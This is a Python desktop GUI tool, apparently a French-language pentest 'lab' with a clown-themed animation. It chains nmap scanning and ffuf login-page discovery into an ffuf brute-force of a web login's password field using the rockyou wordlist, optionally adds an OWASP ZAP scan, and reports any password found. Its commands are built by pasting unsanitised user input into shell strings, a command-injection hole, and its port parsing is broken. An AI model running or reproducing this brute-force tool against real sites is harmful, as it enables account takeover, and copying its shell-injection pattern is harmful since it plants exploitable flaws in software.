#!/usr/bin/env python3
import tkinter as tk
from tkinter import scrolledtext, messagebox
import subprocess, threading, urllib.parse, math, os

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

class ShacoMaruxApp:
    def __init__(self, root):
        self.root = root
        self.root.title("ShacoMarux - Audit & Pentest Lab")
        self.root.geometry("680x670")
        self.root.configure(bg="#110d1b")
        self.root.resizable(False, False)
        try:
            self.icon_img = tk.PhotoImage(file=os.path.join(BASE_DIR, "shaco.png"))
            self.root.iconphoto(False, self.icon_img)
        except Exception:
            pass

        self.bg_canvas = tk.Canvas(root, width=680, height=670, bg="#110d1b", highlightthickness=0)
        self.bg_canvas.place(x=0, y=0)
        self.phase = 0.0
        self.animer_shaco_danse()

        tk.Label(root, text="SHACOMARUX", bg="#110d1b", fg="#a855f7", font=("Sans", 18, "bold")).pack(pady=(10, 2))
        tk.Label(root, text='"Why so serious? Let\'s audit the network..."', bg="#110d1b", fg="#22c55e", font=("Sans", 9, "italic")).pack(pady=(0, 8))

        mode_frame = tk.Frame(root, bg="#1b1429", bd=1, relief="ridge")
        mode_frame.pack(pady=4, padx=20, fill="x")
        self.var_mode = tk.StringVar(value="Username")
        self.var_mode.trace_add("write", self.changer_mode)
        tk.Label(mode_frame, text="Mode d'attaque :", bg="#1b1429", fg="#e2e8f0", font=("Sans", 10, "bold")).pack(side="left", padx=12, pady=6)
        tk.Radiobutton(mode_frame, text="Username", variable=self.var_mode, value="Username", bg="#1b1429", fg="#a855f7", selectcolor="#110d1b", font=("Sans", 10, "bold")).pack(side="left", padx=10)
        tk.Radiobutton(mode_frame, text="Email", variable=self.var_mode, value="Email", bg="#1b1429", fg="#22c55e", selectcolor="#110d1b", font=("Sans", 10, "bold")).pack(side="left", padx=10)

        form = tk.Frame(root, bg="#1b1429", bd=1, relief="ridge")
        form.pack(pady=6, padx=20, fill="x")
        lbl_s = {"bg": "#1b1429", "fg": "#cbd5e1", "font": ("Sans", 10, "bold")}
        ent_s = {"bg": "#261d3a", "fg": "#ffffff", "insertbackground": "#22c55e", "font": ("Monospace", 10), "width": 34, "relief": "flat"}

        tk.Label(form, text="IP / Port Cible :", **lbl_s).grid(row=0, column=0, sticky="e", padx=10, pady=5)
        self.entry_ip = tk.Entry(form, **ent_s); self.entry_ip.insert(0, "127.0.0.1"); self.entry_ip.grid(row=0, column=1, padx=10, pady=5)

        tk.Label(form, text="Page Login ('auto' ou nom) :", **lbl_s).grid(row=1, column=0, sticky="e", padx=10, pady=5)
        self.entry_page = tk.Entry(form, **ent_s); self.entry_page.insert(0, "auto"); self.entry_page.grid(row=1, column=1, padx=10, pady=5)

        self.lbl_id = tk.Label(form, text="Nom d'utilisateur (Login) :", **lbl_s)
        self.lbl_id.grid(row=2, column=0, sticky="e", padx=10, pady=5)
        self.entry_user = tk.Entry(form, **ent_s); self.entry_user.insert(0, "admin"); self.entry_user.grid(row=2, column=1, padx=10, pady=5)

        tk.Label(form, text="Champ User HTML :", **lbl_s).grid(row=3, column=0, sticky="e", padx=10, pady=5)
        self.entry_fu = tk.Entry(form, **ent_s); self.entry_fu.insert(0, "username"); self.entry_fu.grid(row=3, column=1, padx=10, pady=5)

        tk.Label(form, text="Champ Pass HTML :", **lbl_s).grid(row=4, column=0, sticky="e", padx=10, pady=5)
        self.entry_fp = tk.Entry(form, **ent_s); self.entry_fp.insert(0, "password"); self.entry_fp.grid(row=4, column=1, padx=10, pady=5)

        self.var_zap = tk.BooleanVar(value=False)
        tk.Checkbutton(root, text="Inclure le scan OWASP ZAP (rapport_shacomarux.html)", variable=self.var_zap, bg="#110d1b", fg="#facc15", selectcolor="#1b1429", font=("Sans", 9, "bold")).pack(pady=2)

        self.box_canvas = tk.Canvas(root, width=280, height=78, bg="#110d1b", highlightthickness=0, cursor="hand2")
        self.box_canvas.pack(pady=4)
        self.box_open = False
        self.box_bounce = 0.0
        self.is_running = False
        self.dessiner_shaco_box()
        self.box_canvas.bind("<Enter>", lambda e: self.toggle_box(True))
        self.box_canvas.bind("<Leave>", lambda e: self.toggle_box(False))
        self.box_canvas.bind("<Button-1>", lambda e: self.lancer_audit())

        self.console = scrolledtext.ScrolledText(root, bg="#09070f", fg="#22c55e", font=("Monospace", 9), height=13, width=78, bd=1, relief="solid")
        self.console.pack(padx=20, pady=8)
        self.log("ShacoMarux pret ! Survole ou clique sur la Shaco Box pour lancer l'audit.")

    def animer_shaco_danse(self):
        self.bg_canvas.delete("dancer")
        self.phase += 0.14
        sway = math.sin(self.phase) * 14
        bounce = abs(math.cos(self.phase)) * 8
        for cx in (65, 615):
            cy = 240 - bounce
            self.bg_canvas.create_polygon(cx-18+sway, cy-35, cx-35+sway*1.4, cy-60, cx-5+sway, cy-42, fill="#3b0764", tags="dancer")
            self.bg_canvas.create_polygon(cx+18+sway, cy-35, cx+35+sway*1.4, cy-60, cx+5+sway, cy-42, fill="#14532d", tags="dancer")
            self.bg_canvas.create_oval(cx-16+sway, cy-38, cx+16+sway, cy-8, fill="#1e1b2e", outline="#7e22ce", width=2, tags="dancer")
            self.bg_canvas.create_oval(cx-8+sway, cy-26, cx-3+sway, cy-21, fill="#22c55e", tags="dancer")
            self.bg_canvas.create_oval(cx+3+sway, cy-26, cx+8+sway, cy-21, fill="#22c55e", tags="dancer")
            self.bg_canvas.create_line(cx+sway, cy-8, cx-sway*0.5, cy+45, fill="#6b21a8", width=4, tags="dancer")
            arm_y = math.sin(self.phase * 2) * 18
            self.bg_canvas.create_line(cx+sway*0.7, cy+5, cx-28+sway, cy-5+arm_y, fill="#22c55e", width=3, tags="dancer")
            self.bg_canvas.create_line(cx+sway*0.7, cy+5, cx+28+sway, cy-5-arm_y, fill="#a855f7", width=3, tags="dancer")
            self.bg_canvas.create_line(cx-sway*0.5, cy+45, cx-18-sway, cy+85+bounce, fill="#6b21a8", width=3, tags="dancer")
            self.bg_canvas.create_line(cx-sway*0.5, cy+45, cx+18-sway, cy+85-bounce, fill="#15803d", width=3, tags="dancer")
        self.root.after(50, self.animer_shaco_danse)

    def toggle_box(self, state):
        if not self.is_running:
            self.box_open = state

    def dessiner_shaco_box(self):
        self.box_canvas.delete("all")
        self.box_bounce += 0.25
        shake = math.sin(self.box_bounce * 3) * 3 if (self.box_open or self.is_running) else 0
        if self.box_open or self.is_running:
            self.box_canvas.create_line(52+shake, 45, 52-shake, 22, fill="#22c55e", width=3)
            self.box_canvas.create_oval(40-shake, 6, 64-shake, 26, fill="#a855f7", outline="#22c55e", width=2)
            self.box_canvas.create_oval(46-shake, 12, 50-shake, 16, fill="#facc15")
            self.box_canvas.create_oval(54-shake, 12, 58-shake, 16, fill="#facc15")
            self.box_canvas.create_rectangle(24+shake, 32, 42+shake, 42, fill="#7e22ce", outline="#22c55e")
        else:
            self.box_canvas.create_rectangle(28, 35, 76, 43, fill="#7e22ce", outline="#22c55e", width=2)
        self.box_canvas.create_rectangle(30+shake, 43, 74+shake, 74, fill="#4c1d95", outline="#22c55e", width=2)
        self.box_canvas.create_line(52+shake, 43, 52+shake, 74, fill="#22c55e", width=2)
        self.box_canvas.create_line(30+shake, 58, 74+shake, 58, fill="#22c55e", width=2)
        btn_bg = "#22c55e" if not self.is_running else "#eab308"
        txt = "LANCER SHACO BOX" if not self.is_running else "AUDIT EN COURS..."
        self.box_canvas.create_rectangle(88, 22, 272, 66, fill=btn_bg, outline="#a855f7", width=2)
        self.box_canvas.create_text(180, 44, text=txt, fill="#09070f", font=("Sans", 11, "bold"))
        self.root.after(45, self.dessiner_shaco_box)

    def changer_mode(self, *args):
        if self.var_mode.get() == "Username":
            self.lbl_id.config(text="Nom d'utilisateur (Login) :")
            self.entry_fu.delete(0, tk.END); self.entry_fu.insert(0, "username")
        else:
            self.lbl_id.config(text="Adresse E-mail cible :")
            self.entry_fu.delete(0, tk.END); self.entry_fu.insert(0, "email")

    def log(self, msg):
        self.console.insert(tk.END, msg + "\n")
        self.console.see(tk.END)

    def lancer_audit(self):
        if self.is_running:
            return
        ip = self.entry_ip.get().strip()
        page = self.entry_page.get().strip()
        user_id = self.entry_user.get().strip()
        fu = self.entry_fu.get().strip()
        fp = self.entry_fp.get().strip()
        run_zap = self.var_zap.get()
        if not ip or not user_id:
            messagebox.showerror("Erreur", "Entrez l'IP cible et l'identifiant !")
            return
        self.is_running = True
        self.console.delete(1.0, tk.END)

        def task():
            try:
                encoded_id = urllib.parse.quote(user_id)
                host_only = ip.split(":")[0].split("/")[0]
                port_only = ip.split(":")[0].split("/")[0] if ":" in ip else "80"
                self.log("=== [1/4] NMAP RECON (" + host_only + ":" + port_only + ") ===")
                res_nmap = subprocess.getoutput("nmap -sV -Pn -p " + port_only + " " + host_only + " | grep open")
                self.log(res_nmap if res_nmap else "Port ferme ou filtre")

                target_page = page
                if page.lower() == "auto" or not page:
                    self.log("\n=== [2/4] FFUF PAGE DISCOVERY ===")
                    cmd_find = 'printf "login\\nindex\\nconnexion\\nauth\\nadmin\\n" | ffuf -w - -u "http://' + ip + '/FUZZ" -e .php,.html -mc 200,302 -s | head -n 1'
                    target_page = subprocess.getoutput(cmd_find).strip() or "login.php"
                full_url = "http://" + ip + "/" + target_page.lstrip("/")
                self.log("[+] Cible : " + full_url)

                self.log("\n=== [3/4] TEST (" + self.var_mode.get() + " : " + user_id + ") ===")
                wordlist = os.path.expanduser("~/rockyou.txt")
                if not os.path.exists(wordlist):
                    wordlist = "/usr/share/wordlists/rockyou.txt"
                size_err = subprocess.getoutput('curl -s -L -X POST -d "' + fu + '=' + encoded_id + '&' + fp + '=err_shaco_99" "' + full_url + '" | wc -c').strip()
                self.log("[*] Taille erreur : " + size_err + " octets")
                cmd_ffuf = 'ffuf -w "' + wordlist + '" -u "' + full_url + '" -X POST -d "' + fu + '=' + encoded_id + '&' + fp + '=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fs ' + size_err + ' -mc 200,302 -t 10 -se -s'
                found_pass = subprocess.getoutput(cmd_ffuf).strip()

                if run_zap:
                    self.log("\n=== [4/4] OWASP ZAP SCAN ===")
                    rap = os.path.join(BASE_DIR, "rapport_shacomarux.html")
                    subprocess.getoutput('flatpak run org.zaproxy.ZAP -cmd -quickurl "' + full_url + '" -quickout "' + rap + '" -quickprogress')
                    self.log("[+] Rapport ZAP : " + rap)

                self.log("\n==========================================")
                self.log("BILAN SHACOMARUX")
                self.log("   URL   : " + full_url)
                self.log("   Login : " + user_id)
                self.log("   Pass  : " + (found_pass if found_pass else "Non trouve"))
                self.log("==========================================")
            except Exception as e:
                self.log("Erreur : " + str(e))
            finally:
                self.is_running = False
                self.box_open = False

        threading.Thread(target=task, daemon=True).start()

if __name__ == "__main__":
    root = tk.Tk()
    app = ShacoMaruxApp(root)
    root.mainloop()
